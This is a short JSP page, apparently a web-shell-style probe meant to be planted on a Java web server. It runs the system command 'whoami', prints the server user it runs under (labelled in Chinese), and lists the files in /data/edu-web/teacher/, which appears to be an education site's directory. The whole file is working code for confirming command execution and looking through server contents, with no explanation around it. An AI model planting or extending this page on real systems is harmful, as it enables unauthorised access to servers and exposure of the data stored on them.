<%@ page contentType="text/html; charset=utf-8" import="java.io.*"%>  
<%  
try  
{  
    Process process = Runtime.getRuntime().exec ("whoami");  
    String line = new String();  
    out.print("本JSP页面所属用户：");  
    while ((line = new LineNumberReader (new InputStreamReader(process.getInputStream()))  
        .readLine ()) != null){  
        out.println(line);  
    }  
    out.print("<br/>查看目录文件：/data/edu-web/teacher/</br>");  
    for(File f : new File("/data/edu-web/teacher/").listFiles()){  
                out.println(f.getName()+"<br/>");  
    }  
}catch (java.io.IOException e){  
        out.println ("IOException " + e.getMessage());  
}  
%>  